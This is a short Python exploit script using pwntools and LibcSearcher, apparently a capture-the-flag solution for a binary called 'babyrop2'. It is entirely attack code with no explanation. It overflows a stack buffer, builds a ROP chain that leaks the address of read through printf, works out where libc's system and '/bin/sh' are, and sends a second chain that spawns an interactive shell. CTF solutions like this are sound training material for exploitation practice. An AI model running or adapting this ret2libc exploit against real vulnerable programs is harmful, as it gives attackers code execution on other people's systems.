from LibcSearcher import *
from pwn import *

context.arch = 'amd64'
r = process('./babyrop2')
elf = ELF("./babyrop2")
pop_rdi_ret = 0x400733
main_addr = 0x400636
payload = b'a' * 0x28 + flat([pop_rdi_ret, elf.got["read"], elf.plt["printf"], main_addr, 0])
r.recvuntil("name? ")
r.sendline(payload)
r.recvline()
read_addr = u64(r.recvuntil("W")[:-1].ljust(8, b'\x00'))
libc = LibcSearcher("read", read_addr)
libc_base = read_addr - libc.dump("read")
system_addr = libc_base + libc.dump("system")
bin_sh_addr = libc_base + libc.dump("str_bin_sh")
r.recvuntil("name? ")
r.sendline(b'a' * 0x28 + flat([pop_rdi_ret, bin_sh_addr, system_addr]))
r.recvline()
r.interactive()
r.close()
